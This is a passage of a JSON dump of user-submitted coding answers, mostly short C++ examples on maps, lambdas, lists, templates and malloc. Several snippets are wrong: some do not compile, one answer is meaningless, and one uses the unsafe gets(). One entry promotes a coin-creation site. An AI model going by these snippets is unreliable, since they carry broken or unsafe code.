    "description": "map<string, int>::iterator it;  for (it = symbolTable.begin(); it != symbolTable.end(); it++) {     std::cout << it->first    // string (key)               << ':'               << it->second   // string's value                << std::endl; } \n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1681,
    "keyword": null,
    "link": null,
    "title": " cpp gui",
    "description": "// There's a variety of useful libraries: one can use libs that are  // more established  and featureful like Qt and GTK, or use minimalistic // ones like Nuklear and Dear Imgui.  // Qt: https://www.qt.io/product/qt6 // GTK: https://www.gtk.org/ // Nuklear: https://github.com/Immediate-Mode-UI/Nuklear // Dear Imgui: https://github.com/ocornut/imgui\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1682,
    "keyword": null,
    "link": null,
    "title": " cpp how to add collisions to boxes",
    "description": "23 = 34   \n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1683,
    "keyword": null,
    "link": null,
    "title": " cpp how to create an object of template class",
    "description": "template class  Graph<string>;\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1684,
    "keyword": null,
    "link": null,
    "title": " cpp lambda",
    "description": "- Good website to learn lambda in c++: https://docs.microsoft.com/en-us/cpp/cpp/lambda-expressions-in-cpp https://en.cppreference.com/w/cpp/language/lambda https://www.geeksforgeeks.org/lambda-expression-in-c/ https://stackoverflow.com/questions/7627098/what-is-a-lambda-expression-in-c11 https://linuxhint.com/lambda-expressions-in-c/\n#include <iostream> using namespace std;  bool isGreater = [](int a, int b){ return a > b; }  int main() { \tcout << isGreater(5, 2) << endl; // Output: 1 \treturn 0; } \n#include <iostream> #include <string>   // returns a lambda auto makeWalrus(const std::string& name) {   // Capture name by reference and return the lambda.   return [&]() {     std::cout << \"I am a walrus, my name is \" << name << '\\n'; // Undefined behavior   }; }   int main() {   // Create a new walrus whose name is Roofus.   // sayName is the lambda returned by makeWalrus.   auto sayName{ makeWalrus(\"Roofus\") };     // Call the lambda function that makeWalrus returned.   sayName();     return 0; } \nstd::find_if(     myVector.begin(), myVector.end(),     [&toFind](const MyStruct& x) { return x.m_id == toFind.m_id;});\nstruct X {     int x, y;     int operator()(int);     void f()     {         // the context of the following lambda is the member function X::f         [=]()->int         {             return operator()(this->x + y); // X::operator()(this->x + (*this).y)                                             // this has type X*         };     } };\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1685,
    "keyword": null,
    "link": null,
    "title": " cpp lambda function",
    "description": "- Good website to learn lambda in c++: https://docs.microsoft.com/en-us/cpp/cpp/lambda-expressions-in-cpp https://en.cppreference.com/w/cpp/language/lambda https://www.geeksforgeeks.org/lambda-expression-in-c/ https://stackoverflow.com/questions/7627098/what-is-a-lambda-expression-in-c11 https://linuxhint.com/lambda-expressions-in-c/\n#include <iostream> using namespace std;  bool isGreater = [](int a, int b){ return a > b; }  int main() { \tcout << isGreater(5, 2) << endl; // Output: 1 \treturn 0; } \n#include <iostream> #include <string>   // returns a lambda auto makeWalrus(const std::string& name) {   // Capture name by reference and return the lambda.   return [&]() {     std::cout << \"I am a walrus, my name is \" << name << '\\n'; // Undefined behavior   }; }   int main() {   // Create a new walrus whose name is Roofus.   // sayName is the lambda returned by makeWalrus.   auto sayName{ makeWalrus(\"Roofus\") };     // Call the lambda function that makeWalrus returned.   sayName();     return 0; } \nstruct X {     int x, y;     int operator()(int);     void f()     {         // the context of the following lambda is the member function X::f         [=]()->int         {             return operator()(this->x + y); // X::operator()(this->x + (*this).y)                                             // this has type X*         };     } };\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1686,
    "keyword": null,
    "link": null,
    "title": " cpp language explained",
    "description": "#include <iostream> using namespace std; class BaseClass { public:    void disp(){       cout<<\"Function of Parent Class\";    } }; class DerivedClass: public BaseClass{ public:    void disp() {       cout<<\"Function of Child Class\";    } }; int main() {    /* Reference of base class pointing to     * the object of child class.     */    BaseClass obj = DerivedClass();     obj.disp();    return 0; }\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1687,
    "keyword": null,
    "link": null,
    "title": " cpp linked list",
    "description": "#include <iostream>  using namespace std;  struct node {     int data;     node *next; };  class linked_list { private:     node *head,*tail; public:     linked_list()     {         head = NULL;         tail = NULL;     }      void add_node(int n)     {         node *tmp = new node;         tmp->data = n;         tmp->next = NULL;          if(head == NULL)         {             head = tmp;             tail = tmp;         }         else         {             tail->next = tmp;             tail = tail->next;         }     } };  int main() {     linked_list a;     a.add_node(1);     a.add_node(2);     return 0; }\n #include <bits/stdc++.h> #include <iostream> #include <list> #include <iterator>  #define ll long long  using namespace std;  //function to print all the elements of the linked list void showList(list <int> l){ \tlist <int> :: iterator it; //create an iterator according to the data structure \tfor(it = l.begin(); it != l.end(); it++){ \t\tcout<<*it<<\" \"; \t} \t }\t   int main(){ \t \tlist <int> l1; \tlist <int> l2; \t \tfor(int i=0; i<10; i++){ \t\tl1.push_back(i*2); //fill list 1 with multiples of 2 \t\tl2.push_back(i*3); //fill list 2 with multiples of 3 \t} \t \tcout<<\"content of list 1 is \"<<endl; \tshowList(l1); \tcout<<endl; \t \tcout<<\"content of list 2 is \"<<endl; \tshowList(l2); \tcout<<endl; \t \t//reverse the first list \tl1.reverse(); \tshowList(l1); \tcout<<endl; \t \t//sort the first list \tl1.sort(); \tshowList(l1); \tcout<<endl; \t \t//removing an element from both sides \tl2.pop_front(); \tl2.pop_back(); \t \t//adding an element from both sides \tl2.push_back(10); \tl2.push_front(20); \t \t     return 0; }\nstruct Node {   int data;   struct Node *next; };\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1688,
    "keyword": null,
    "link": null,
    "title": " cpp loop through object",
    "description": "std::list<Student>::iterator it; for (it = data.begin(); it != data.end(); ++it){     std::cout << it->name; }\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1689,
    "keyword": null,
    "link": null,
    "title": " cpp macro",
    "description": "#define PRINT(x) std::cout << x << std::endl\n",
    "reg_date": "2021-10-12T11:39:31.000Z"
  },
  {
    "id": 1690,
    "keyword": null,
    "link": null,
    "title": " cpp make class abstract",
    "description": "struct Abstract {      virtual ~Abstract() = 0; };  Abstract::~Abstract() {}  struct Valid: public Abstract {         // Notice you don't need to actually overide the base         // classes pure virtual method as it has a default };   int main() {     // Abstract        a;  // This line fails to compile as Abstract is abstract     Valid           v;  // This compiles fine. }\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1691,
    "keyword": null,
    "link": null,
    "title": " cpp malloc",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint *ptr; \tptr = (int*) malloc(5*sizeof(int));  \tif(!ptr) \t{ \t\tcout << \"Memory Allocation Failed\"; \t\texit(1); \t} \tcout << \"Initializing values...\" << endl << endl;  \tfor (int i=0; i<5; i++) \t{ \t\tptr[i] = i*2+1; \t} \tcout << \"Initialized values\" << endl;  \tfor (int i=0; i<5; i++) \t{ \t\t/* ptr[i] and *(ptr+i) can be used interchangeably */ \t\tcout << *(ptr+i) << endl; \t}  \tfree(ptr); \treturn 0; }\n/* malloc example: random string generator*/ #include <stdio.h>      /* printf, scanf, NULL */ #include <stdlib.h>     /* malloc, free, rand */  int main () {   int i,n;   char * buffer;    printf (\"How long do you want the string? \");   scanf (\"%d\", &i);    buffer = (char*) malloc (i+1);   if (buffer==NULL) exit (1);    for (n=0; n<i; n++)     buffer[n]=rand()&+'a';   buffer[i]='\\0';    printf (\"Random string: %s\\n\",buffer);   free (buffer);    return 0; }\nint alloc_size = 10; int* buffer = (int*) malloc (alloc_size); //Allocate memory block which can fit 10 integers \nvoid* malloc(size_t size);\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1692,
    "keyword": null,
    "link": null,
    "title": " cpp map insert",
    "description": "std::map<TypeA, TypeB> my_map;\t// TypeA key; TypeB value my_map.insert({ key, value }); \t// insert elements in random order\nmp.insert({ 2, 30 }); \n  mymap.insert ( std::pair<char,int>('a',100) );\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1693,
    "keyword": null,
    "link": null,
    "title": " cpp map iterate over keys",
    "description": "#include <iostream> #include <map>  int main() {     std::map<std::string, int> myMap;      myMap[\"one\"] = 1;     myMap[\"two\"] = 2;     myMap[\"three\"] = 3;      for ( const auto &myPair : myMap ) {         std::cout << myPair.first << \"\\n\";     } } \n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1694,
    "keyword": null,
    "link": null,
    "title": " cpp nan value",
    "description": "What is NaN ? NaN, acronym for &ldquo;Not a Number&rdquo; is an exception which usually occurs in the caseswhen an expression results in a number that can&rsquo;t be represented.  For example square root of negative numbers.      // C++ code to demonstrate NaN exception  #include<iostream>  #include<cmath> // for sqrt()  using namespace std;  int main()  {      float a = 2, b = -2;         // Prints the number (1.41421)      cout << sqrt(a) << endl;         // Prints \"nan\" exception      // sqrt(-2) is complex number      cout << sqrt(b) << endl;         return 0;  }  Output:  1.41421 -nan\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1695,
    "keyword": null,
    "link": null,
    "title": " cpp online compiler",
    "description": "These two are good C++ compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/\nBest Site With auto compile : https://godbolt.org/z/nEo4j7\nIDE Shortcuts: New file : Ctrl-M Run Code : F9 Debug Code : F8 Save Project : Ctrl-S Beautify Code : Ctrl-B Settings Menu : Ctrl-Shift-S Info : Ctrl-I  Editor Shortcuts: showSettingsMenu : Ctrl-, goToNextError : Alt-E goToPreviousError : Alt-Shift-E selectall : Ctrl-A gotoline : Ctrl-L fold : Alt-L|Ctrl-F1 unfold : Alt-Shift-L|Ctrl-Shift-F1 toggleFoldWidget : F2 toggleParentFoldWidget : Alt-F2 foldOther : Alt-0 unfoldall : Alt-Shift-0 findnext : Ctrl-K findprevious : Ctrl-Shift-K selectOrFindNext : Alt-K selectOrFindPrevious : Alt-Shift-K find : Ctrl-F overwrite : Insert selecttostart : Ctrl-Shift-Home gotostart : Ctrl-Home selectup : Shift-Up golineup : Up selecttoend : Ctrl-Shift-End gotoend : Ctrl-End selectdown : Shift-Down golinedown : Down selectwordleft : Ctrl-Shift-Left gotowordleft : Ctrl-Left selecttolinestart : Alt-Shift-Left gotolinestart : Alt-Left|Home selectleft : Shift-Left gotoleft : Left selectwordright : Ctrl-Shift-Right gotowordright : Ctrl-Right selecttolineend : Alt-Shift-Right gotolineend : Alt-Right|End selectright : Shift-Right gotoright : Right selectpagedown : Shift-Pagedown gotopagedown : Pagedown selectpageup : Shift-Pageup gotopageup : Pageup scrollup : Ctrl-Up scrolldown : Ctrl-Down selectlinestart : Shift-Home selectlineend : Shift-End togglerecording : Ctrl-Alt-E replaymacro : Ctrl-Shift-E jumptomatching : Ctrl-P selecttomatching : Ctrl-Shift-P expandToMatching : Ctrl-Shift-M removeline : Ctrl-D duplicateSelection : Ctrl-Shift-D sortlines : Ctrl-Alt-S togglecomment : Ctrl-/ toggleBlockComment : Ctrl-Shift-/ modifyNumberUp : Ctrl-Shift-Up modifyNumberDown : Ctrl-Shift-Down replace : Ctrl-H undo : Ctrl-Z redo : Ctrl-Shift-Z|Ctrl-Y copylinesup : Alt-Shift-Up movelinesup : Alt-Up copylinesdown : Alt-Shift-Down movelinesdown : Alt-Down del : Delete backspace : Shift-Backspace|Backspace cut_or_delete : Shift-Delete removetolinestart : Alt-Backspace removetolineend : Alt-Delete removewordleft : Ctrl-Backspace removewordright : Ctrl-Delete outdent : Shift-Tab indent : Tab blockoutdent : Ctrl-[ blockindent : Ctrl-] transposeletters : Ctrl-T touppercase : Ctrl-U tolowercase : Ctrl-Shift-U expandtoline : Ctrl-Shift-L addCursorAbove : Ctrl-Alt-Up addCursorBelow : Ctrl-Alt-Down addCursorAboveSkipCurrent : Ctrl-Alt-Shift-Up addCursorBelowSkipCurrent : Ctrl-Alt-Shift-Down selectMoreBefore : Ctrl-Alt-Left selectMoreAfter : Ctrl-Alt-Right selectNextBefore : Ctrl-Alt-Shift-Left selectNextAfter : Ctrl-Alt-Shift-Right splitIntoLines : Ctrl-Alt-L alignCursors : Ctrl-Alt-A findAll : Ctrl-Alt-K showKeyboardShortcuts : Ctrl-Alt-H           \ntemplate < class T, class Alloc = allocator<T> > class vector; // generic template \nThree good online compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/ http://cpp.sh/\nGood cpp compilers: --------------------- repl.it/languages/cpp www.w3schools.com/cpp/trycpp.asp?filename=demo_helloworld onlinegdb.com/online_c++_compiler programiz.com/cpp-programming/online-complier cpp.sh\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1696,
    "keyword": null,
    "link": null,
    "title": " cpp print vector",
    "description": "for(int i = 0; i < vec.size(); i++)     std::cout << vec[i] << ' ';\n#include <iostream> #include <vector>  int main() { \tstd::vector<int> myVector = {1, 2, 3, 4, 5, 6};  \tfor(int i = 0; i < myVector.size(); i++) \t{ \t\tstd::cout << myVector[i] << std::endl;                  //***** alternate method ******* \t\t//std::cout << myVector.at(i) << std::endl;\t\t \t}\t }\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1697,
    "keyword": null,
    "link": null,
    "title": " cpp program to find average of n numbers",
    "description": "#include <iostream> using namespace std;  int main() {          // initialize an array without specifying size     double numbers[] = {7, 5, 6, 12, 35, 27};      double sum = 0;     double count = 0;     double average;      cout << \"The numbers are: \";      //  print array elements     // use of range-based for loop     for (const double &n : numbers) {         cout << n << \"  \";          //  calculate the sum         sum += n;          // count the no. of array elements         ++count;     }      // print the sum     cout << \"\\nTheir Sum = \" << sum << endl;      // find the average     average = sum / count;     cout << \"Their Average = \" << average << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1698,
    "keyword": null,
    "link": null,
    "title": " cpp program to temove space from string",
    "description": "#include<iostream> #include<string.h> using namespace std; int main () {   char str[80];     int i=0, len, j;     cout << \"Enter a string : \";     gets(str);     len = strlen(str);     for( i = 0; i < len; i++)     {         if (str[i] == ' ')         {             for (j = i; j < len; j++)                 str[j] = str[j+1];             len--;         }     }     cout << \"Resultant string : \" << str;     return 0; }\n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1699,
    "keyword": null,
    "link": null,
    "title": " cpp program using t escape sequence",
    "description": " Escape sequence\tHex value in ASCII\tCharacter represented \\a\t07\tAlert (Beep, Bell) (added in C89)[1] \\b\t08\tBackspace \\enote 1\t1B\tEscape character \\f\t0C\tFormfeed Page Break \\n\t0A\tNewline (Line Feed); see notes below \\r\t0D\tCarriage Return \\t\t09\tHorizontal Tab \\v\t0B\tVertical Tab \\\\\t5C\tBackslash \\'\t27\tApostrophe or single quotation mark \\\"\t22\tDouble quotation mark \\?\t3F\tQuestion mark (used to avoid trigraphs) \\nnnnote 2\tany\tThe byte whose numerical value is given by nnn interpreted as an octal number \\xhh&hellip;\tany\tThe byte whose numerical value is given by hh&hellip; interpreted as a hexadecimal number \\uhhhhnote 3\tnone\tUnicode code point below 10000 hexadecimal \\Uhhhhhhhhnote 4\tnone\tUnicode code point where h is a hexadecimal digit  \t\t\t\t\t\t\t\t\t\t\t\t\t\t//code by gokul aakash\nescape squence \n",
    "reg_date": "2021-10-12T11:39:32.000Z"
  },
  {
    "id": 1700,
    "keyword": null,
    "link": null,
    "title": " cpp projects for beginners",
    "description": "1. Calculators (Math, Tax, Physics, Chemistry, etc.) to get a feel of the scientific and basic uses for C++ 2. Database (Be creative, use user input and textfile I/O) 3. Any CLI games (Helps with OOP and algorithmic thinking) 4. Mock Banking/Transaction programs 5. Applets (Innovate!) 6. Huffman Encoding Algorithm (It's an amazing project trust) 7. Credit card verifier (found it during CS50, it's a good one) Try using the concepts you're learning in school (if you're in school) to apply them in a C++ program, ideally something with some input/output and computations involved\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1701,
    "keyword": null,
    "link": null,
    "title": " cpp rand",
    "description": "std::srand(std::time(nullptr)); \t\t// set rand seed v1 = std::rand() % 100;         // v1 in the range 0 to 99 v2 = std::rand() % 100 + 1;     // v2 in the range 1 to 100 v3 = std::rand() % 30 + 1985;   // v3 in the range 1985-2014 \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\nv1 = rand() % 100;         // v1 in the range 0 to 99  --Credit goes to Clever cowfish v2 = rand() % 100 + 1;     // v2 in the range 1 to 100 v3 = rand() % 30 + 1985;   // v3 in the range 1985-2014\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1702,
    "keyword": null,
    "link": null,
    "title": " cpp random number in range",
    "description": "min + ( std::rand() % ( max - min + 1 ) )\nint range = max - min + 1; int num = rand() % range + min; \n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1703,
    "keyword": null,
    "link": null,
    "title": " cpp regex match",
    "description": "std::regex re(\"Get|GetValue\"); std::cmatch m; std::regex_search(\"GetValue\", m, re);  // returns true, and m[0] contains \"Get\" std::regex_match (\"GetValue\", m, re);  // returns true, and m[0] contains \"GetValue\" std::regex_search(\"GetValues\", m, re); // returns true, and m[0] contains \"Get\" std::regex_match (\"GetValues\", m, re); // returns false\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1704,
    "keyword": null,
    "link": null,
    "title": " cpp return array",
    "description": "#include <iostream>  using namespace std;     int* fun()  {      int* arr = new int[100];         /* Some operations on arr[] */     arr[0] = 10;      arr[1] = 20;         return arr;  }     int main()  {      int* ptr = fun();      cout << ptr[0] << \" \" << ptr[1];      return 0;  } \nint * fillarr(int arr[], int length){    for (int i = 0; i < length; ++i){       // arr[i] = ? // do what you want to do here    }    return arr; }  // then where you want to use it. int main(){ int arr[5]; int *arr2;  arr2 = fillarr(arr, 5);  } // at this point, arr & arr2 are basically the same, just slightly // different types.  You can cast arr to a (char*) and it'll be the same. \n#include <iostream> #include <ctime>  using namespace std;  // function to generate and retrun random numbers. int * getRandom( ) {     static int  r[10];     // set the seed    srand( (unsigned)time( NULL ) );        for (int i = 0; i < 10; ++i) {       r[i] = rand();       cout << r[i] << endl;    }     return r; }  // main function to call above defined function. int main () {     // a pointer to an int.    int *p;     p = getRandom();        for ( int i = 0; i < 10; i++ ) {       cout << \"*(p + \" << i << \") : \";       cout << *(p + i) << endl;    }     return 0; }\nstring* getNames() {  string* names = new string[3];  names[0] = \"Simon\";  names[1] = \"Peter\";  names[2] = \"Dave\";    return names; } \nvoid printChars(char c, int count) {     for (int i=0; i<count; i++) {        cout << c;     }//end for         return;  // Optional because it's a void function }//end printChars \n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1705,
    "keyword": null,
    "link": null,
    "title": " cpp sample code",
    "description": "#include<iostream> using namespace std;  int main() { cout << \" hello world <<endl;      return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include<iostream> using namespace std;  int main() { cout << \" hello world\" <<endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1706,
    "keyword": null,
    "link": null,
    "title": " cpp set time",
    "description": "#include <time.h>  struct tm time = { 0 };  time.tm_year = Year - 1900; time.tm_mon  = Month - 1; time.tm_mday = Day; time.tm_hour = Hour; time.tm_min  = Minute; time.tm_sec  = Second;  if (time.tm_year < 0) {     time.tm_year = 0; }  time_t t = mktime(&time);  if (t != (time_t) -1) {     stime(&t); } \n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1707,
    "keyword": null,
    "link": null,
    "title": " cpp split string by space",
    "description": "std::vector<std::string> string_split(const std::string& str) { \tstd::vector<std::string> result; \tstd::istringstream iss(str); \tfor (std::string s; iss >> s; ) \t\tresult.push_back(s); \treturn result; }\n// Extract the first token char * token = strtok(string, \" \"); // loop through the string to extract all other tokens while( token != NULL ) {   printf( \" %s\\n\", token ); //printing each token   token = strtok(NULL, \" \"); } return 0;\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1708,
    "keyword": null,
    "link": null,
    "title": " cpp stack",
    "description": "stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n/* Stack is a data structure that provides two O(1) time operations: adding an element to the top and removing an element from the top. It is only possible to access the top element of a stack. */ stack<int> s; s.push(3); s.push(2); s.push(5); cout << s.top(); // 5 s.pop(); cout << s.top(); // 2\n// Fast DIY Stack template<class S, const int N> class Stack { private:     S arr[N];     int top_i;  public:     Stack() : arr(), top_i(-1) {}     void push (S n) {         arr[++top_i] = n;     }     void pop() {         top_i--;     }     S top() {         return arr[top_i];     }     S bottom() {         return arr[0];     }     int size() {         return top_i+1;     } };\n#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#take input 2D vector  vector<vector<int> > v; for(int i=0;i<n;i++){ for(int j=0;j<m;j++){ v[i].push_back(data); }}\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1709,
    "keyword": null,
    "link": null,
    "title": " cpp starting code",
    "description": " \t// A hello world program in C++  \t#include<iostream> \tusing namespace std;  \tint main() \t{ \t\tcout << \"Hello World!\"; \t\treturn 0; \t}  \n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1710,
    "keyword": null,
    "link": null,
    "title": " cpp std list example",
    "description": "#include <algorithm> #include <iostream> #include <list>   int main() {     // Create a list containing integers     std::list<int> l = { 7, 5, 16, 8 };       // Add an integer to the front of the list     l.push_front(25);     // Add an integer to the back of the list     l.push_back(13);       // Insert an integer before 16 by searching     auto it = std::find(l.begin(), l.end(), 16);     if (it != l.end()) {         l.insert(it, 42);     }       // Print out the list     std::cout << \"l = { \";     for (int n : l) {         std::cout << n << \", \";     }     std::cout << \"};\\n\"; }\n",
    "reg_date": "2021-10-12T11:39:33.000Z"
  },
  {
    "id": 1711,
    "keyword": null,
    "link": null,
    "title": " cpp string find all occurence",
    "description": "#include <string> #include <iostream>  using namespace std;  int main() {     string s(\"hello hello\");     int count = 0;     size_t nPos = s.find(\"hello\", 0); // first occurrence     while(nPos != string::npos)     {         count++;         nPos = s.find(\"hello\", nPos + 1);     }      cout << count; };\nstring str,sub; // str is string to search, sub is the substring to search for  vector<size_t> positions; // holds all the positions that sub occurs within str  size_t pos = str.find(sub, 0); while(pos != string::npos) {     positions.push_back(pos);     pos = str.find(sub,pos+1); } \n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1712,
    "keyword": null,
    "link": null,
    "title": " cpp template",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n// template function template <class T> T Large(T n1, T n2) { \treturn (n1 > n2) ? n1 : n2; }\n#include <iostream> using namespace std;  class F {      };    class S : public F {      };  template<typename X, typename Y> class check {     class F { };     static F find( ... );           class T { F f[2]; };     static T find( Y* );          public:     enum      {          m = sizeof(T) == sizeof(find(static_cast<X*>(0)))              };      };  template <class Q, class R>   bool checkIf()  {     return check<Q, R>::m; }   int main() {          check <class F, class S> t (F,S);     cout << checkIf<class F, class S>() <<endl;     return 0;      }\n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1713,
    "keyword": null,
    "link": null,
    "title": " cpp thread sleep",
    "description": "// this_thread::sleep_for example #include <iostream>       // std::cout, std::endl #include <thread>         // std::this_thread::sleep_for #include <chrono>         // std::chrono::seconds   int main()  {   std::cout << \"countdown:\\n\";   for (int i=10; i>0; --i) {     std::cout << i << std::endl;     std::this_thread::sleep_for (std::chrono::seconds(1));   }   std::cout << \"Lift off!\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1714,
    "keyword": null,
    "link": null,
    "title": " cpp throw string",
    "description": "throw std::string(\"message\");\n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1715,
    "keyword": null,
    "link": null,
    "title": " cpp tutorial",
    "description": "return_type function_name( parameter list ); \n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1716,
    "keyword": null,
    "link": null,
    "title": " cpp unordered map has key",
    "description": "// Function to check if the key is present or not string check_key(map<int, int> m, int key) {     // Key is not present     if (m.find(key) == m.end())         return \"Not Present\";        return \"Present\"; }\n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1717,
    "keyword": null,
    "link": null,
    "title": " cpp vector structure",
    "description": "#include <vector>  typedef struct test1 {   int a;   char b; } TOTO;  std::vector<TOTO> _v;  _v.push_back((TOTO){10, 'a'}); _v[0].a = 101;\n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1718,
    "keyword": null,
    "link": null,
    "title": " creare array con c++",
    "description": "#include <iostream> int main() { int myArray[] {2, 4, 6, 8, 10}; for (int i=0; i<5; i++) { std::cout << \"index: \" << i << \" - value: \" << myArray[i] << \"\\n\"; } return 0; }\n",
    "reg_date": "2021-10-12T11:39:34.000Z"
  },
  {
    "id": 1719,
    "keyword": null,
    "link": null,
    "title": " create a coin for free",
    "description": "Just go to https://cryptocreate.webflow.io/ and customize your own blockchain and create it. Thank me later\n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1720,
    "keyword": null,
    "link": null,
    "title": " create a dictionary cpp",
    "description": "  // The equivalent to python dictionaries are maps in c++   map<int, char> mymap; // Enter required types and name   mymap[1] = 'a';   mymap[4] = 'b';   cout << \"my map is -\" << mymap[1] << \" \" < <mymap[4] << endl;\n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1721,
    "keyword": null,
    "link": null,
    "title": " create a string of length c++",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1722,
    "keyword": null,
    "link": null,
    "title": " create array c++",
    "description": "#include <iostream> using std::cout;  int a[] = { 1, 2, 3, 4, 5 }; int counta()   {   return sizeof( a ) / sizeof( a[ 0 ] );  // works, since a[] is an array   }  int countb( int b[] )   {   return sizeof( b ) / sizeof( b[ 0 ] );  // fails, since b[] is a pointer   }\nint foo [] = { 16, 2, 77, 40, 12071 };\nint foo [5];\nvoid initarr(int arrgender[TOT_MALE][TOT_FEMALE])   {       for(int a =0; a < TOT_MALE;a++)       {           for(int b = 0; b < TOT_FEMALE;b++)           {               arrgender[a][b] = 0;           }       }\nint arr[3] = {1, 5, 4};\nint foo[5] = {0};\n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1723,
    "keyword": null,
    "link": null,
    "title": " create class instance c++",
    "description": "class Rectangle  { \tint width, height; public: \tvoid set_values (int,int);     int area() {return width*height;} };  void Rectangle::set_values (int x, int y) { \twidth = x; \theight = y; }\nclass Rectangle {     int width, height;   public:     void set_values (int,int);     int area (void); } rect;\nMyClass* MyObject = new MyClass();\n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1724,
    "keyword": null,
    "link": null,
    "title": " create copy constructor c++",
    "description": "// Copy constructor      Point(const Point &p2) {x = p2.x; y = p2.y; }         int getX()            {  return x; }      int getY()            {  return y; }  }; \n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1725,
    "keyword": null,
    "link": null,
    "title": " create copy of range of string c++",
